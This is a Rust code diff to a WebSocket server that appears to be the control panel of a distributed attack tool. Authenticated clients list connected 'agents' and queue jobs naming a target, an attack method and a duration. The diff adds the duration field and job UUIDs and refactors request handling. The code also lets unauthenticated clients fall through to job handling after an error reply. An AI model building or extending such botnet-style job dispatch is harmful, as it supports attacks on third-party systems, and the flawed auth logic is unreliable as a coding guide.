@@ -1,17 +1,19 @@
 use std::hash::RandomState;
 use std::ops::Deref;
 use std::str::FromStr;
+use std::time::Duration;
 use std::{collections::HashMap, sync::Arc};
 use std::net::SocketAddr;
 
-use futures::SinkExt;
 use serde::{Serialize, Deserialize};
 use serde_json::{self, Value};
 
+use futures::SinkExt;
 use futures::stream::StreamExt;
 
 use tokio::net::{TcpListener, TcpStream};
 use tokio_tungstenite::tungstenite::protocol::Message;
+use uuid::{NoContext, Timestamp, Uuid};
 
 use crate::{AttackMethod, Job, MAShared, ProfileConfig};
 
@@ -23,6 +25,7 @@ enum ClientError {
     Invalidusername,
     InvalidPassword,
     NoAuth,
+    InvalidDuration,
     InvalidAttackMethod
 }
 
@@ -67,12 +70,105 @@ fn auth(profile: Arc<ProfileConfig>, username: String, password: String) -> Resu
     }
 }
 
+fn find_parameter_json(parameters: HashMap<String, Value, RandomState>, parameter_name: &str) -> Result<String, ErrorResponseJson> { 
+    match parameters.get(parameter_name) {
+        Some(r) => {
+            if let Some(s) = r.as_str() {
+                Ok(s.to_string())
+            } else {
+                Err(ErrorResponseJson { 
+                    error: ClientError::InvalidJsonDatatype, 
+                    message: "Invalid JSON datatype".to_string() 
+                })
+            }
+        },
+        None => {
+            Err(ErrorResponseJson { error: ClientError::NotFoundJsonParameter, message: format!("'{}' paramenter not found", parameter_name) })
+        }
+    }
+}
+
+async fn method_managment(msgjson: RequestJson<Value>, shared: Arc<MAShared>) -> Option<Message> {
+    let message: Option<Message> = match msgjson.method {
+        Method::Auth => None,
+        Method::Jobs => {
+            Some(Message::Text(
+                    serde_json::to_string(&ResponseJson{ data: shared.jobs.lock().await.deref() }).unwrap()
+                    )
+                )
+        },
+        Method::ListAgents => {
+            Some(Message::Text(
+                    serde_json::to_string(&ResponseJson { data: shared.agents.lock().await.deref() }).unwrap()
+            ))
+        },
+        Method::AddJob => 'c: {
+            let target = match find_parameter_json(msgjson.parameters.to_owned(), "target") {
+                Ok(r) => r,
+                Err(e) => {
+                    break 'c Some(Message::Text(serde_json::to_string(&e).unwrap()))
+                }
+            };
+
+            let method = match find_parameter_json(msgjson.parameters.to_owned(), "method") {
+                Ok(r) => {
+                    if let Ok(am) = AttackMethod::from_str(&r) {
+                        am
+                    } else {
+                        let error = serde_json::to_string(
+                                &ErrorResponseJson { error: ClientError::InvalidAttackMethod, message: "Invalid attack method".to_string() }
+                            ).unwrap();
+                        break 'c Some(Message::Text(error))
+                    }
+                },
+                Err(e) => {
+                    break 'c Some(Message::Text(serde_json::to_string(&e).unwrap()))
+                }
+            };
+
+            let duration = match find_parameter_json(msgjson.parameters, "duration") {
+                Ok(r) => {
+                    match r.parse::<f32>() {
+                        Ok(rint) => Duration::from_secs_f32(rint), 
+                        Err(_) => {
+                            let error = serde_json::to_string(
+                                    &ErrorResponseJson { error: ClientError::InvalidDuration, message: "Invalid duration".to_string() }
+                                ).unwrap();
+                            break 'c Some(Message::Text(serde_json::to_string(&error).unwrap()))
+                        },
+                    }
+                },
+                Err(e) => {
+                    break 'c Some(Message::Text(serde_json::to_string(&e).unwrap()))
+                }
+            };
+
+            let new_job = Job { 
+                uuid: Uuid::new_v7(Timestamp::now(NoContext)).to_string(),
+                duration,
+                target,
+                method,
+                agents: 0
+            };
+
+            shared.jobs.lock().await.push(new_job);
+
+            Some(Message::Text(
+                serde_json::to_string(&ResponseJson { data: "ok" }).unwrap())
+            )
+        },  
+    };
+
+    message
+}
+
 async fn handle_connection(
         stream: TcpStream, 
         addr: SocketAddr,
         shared: Arc<MAShared>,
     ) {
-    println!("New connection: {}", addr);
+    println!("New client connection: {}", addr);
+
     let mut authed = false;
     let ws_stream = tokio_tungstenite::accept_async(stream)
         .await
@@ -86,24 +182,6 @@ async fn handle_connection(
 
         match msg {
             Message::Text(data) => {
-                fn find_parameter_json(parameters: HashMap<String, Value, RandomState>, parameter_name: &str) -> Result<String, ErrorResponseJson> { 
-                    match parameters.get(parameter_name) {
-                        Some(r) => {
-                            if let Some(s) = r.as_str() {
-                                Ok(s.to_string())
-                            } else {
-                                Err(ErrorResponseJson { 
-                                    error: ClientError::InvalidJsonDatatype, 
-                                    message: "Invalid JSON datatype".to_string() 
-                                })
-                            }
-                        },
-                        None => {
-                            Err(ErrorResponseJson { error: ClientError::NotFoundJsonParameter, message: format!("'{}' paramenter not found", parameter_name) })
-                        }
-                    }
-                }
-
                 let msgjson: RequestJson<Value> = match serde_json::from_str(&data) {
                     Ok(r) => r,
                     Err(e) => {
@@ -123,6 +201,7 @@ async fn handle_connection(
                         Ok(r) => r,
                         Err(e) => {
                             writer.send(Message::Text(serde_json::to_string(&e).unwrap())).await.unwrap();
+
                             break
                         }
                     };
@@ -130,12 +209,13 @@ async fn handle_connection(
                         Ok(r) => r,
                         Err(e) => {
                             writer.send(Message::Text(serde_json::to_string(&e).unwrap())).await.unwrap();
+
                             break
                         }
                     };
 
                     match auth(profile_clone, username, password) {
-                        Ok(_) => authed = true,
+                        Ok(()) => authed = true,
                         Err(e) => {
                             let message = match e {
                                 ClientError::Invalidusername => "Invalid username".to_string(),
@@ -146,8 +226,8 @@ async fn handle_connection(
                             let error = serde_json::to_string(
                                 &ErrorResponseJson { error: e, message: message.to_string() }
                             );
-
                             writer.send(Message::Text(error.unwrap())).await.unwrap();
+
                             break
                         }
                     }
@@ -155,7 +235,6 @@ async fn handle_connection(
                     writer.send(Message::Text(
                             serde_json::to_string(&ResponseJson { data: "ok" }).unwrap())
                     ).await.unwrap();
-
                 } else {
                     if !authed {
                         let error = serde_json::to_string(
@@ -165,53 +244,8 @@ async fn handle_connection(
                         writer.send(Message::Text(error)).await.unwrap();
                     }
 
-                    match msgjson.method {
-                        Method::Auth => (),
-                        Method::Jobs => {
-                            writer.send(Message::Text(
-                                    serde_json::to_string(&ResponseJson{ data: shared.jobs.lock().await.deref() }).unwrap()
-                                    )
-                                ).await.unwrap()
-                        },
-                        Method::ListAgents => {
-                            writer.send(Message::Text(
-                                    serde_json::to_string(&ResponseJson { data: shared.agents.lock().await.deref() }).unwrap()
-                            )).await.unwrap();
-                        },
-                        Method::AddJob => 'c: {
-                            let target = match find_parameter_json(msgjson.parameters.to_owned(), "target") {
-                                Ok(r) => r,
-                                Err(e) => {
-                                    writer.send(Message::Text(serde_json::to_string(&e).unwrap())).await.unwrap();
-                                    break 'c
-                                }
-                            };
-
-                            let method = match find_parameter_json(msgjson.parameters, "method") {
-                                Ok(r) => {
-                                    if let Ok(am) = AttackMethod::from_str(&r) {
-                                        am
-                                    } else {
-                                        let error = serde_json::to_string(
-                                                &ErrorResponseJson { error: ClientError::InvalidAttackMethod, message: "Invalid attack method".to_string() }
-                                            ).unwrap();
-                                        writer.send(Message::Text(error)).await.unwrap();
-                                        break 'c
-                                    }
-                                },
-                                Err(e) => {
-                                    writer.send(Message::Text(serde_json::to_string(&e).unwrap())).await.unwrap();
-                                    break 'c
-                                }
-                            };
-
-                            let new_job = Job { target, method, agents: 0 };
-                            shared.jobs.lock().await.push(new_job);
-
-                            writer.send(Message::Text(
-                                serde_json::to_string(&ResponseJson { data: "ok" }).unwrap())
-                            ).await.unwrap();
-                        },  
+                    if let Some(message) = method_managment(msgjson, shared.to_owned()).await {
+                        writer.send(message).await.unwrap()
                     }
                 }
             }
@@ -236,7 +270,8 @@ pub async fn run(server_addr: &str, shared: Arc<MAShared>) {
         tokio::spawn(handle_connection(
                 stream, 
                 client_addr,
-                shared_clone)
-            );
+                shared_clone
+            )
+        );
     }
 }
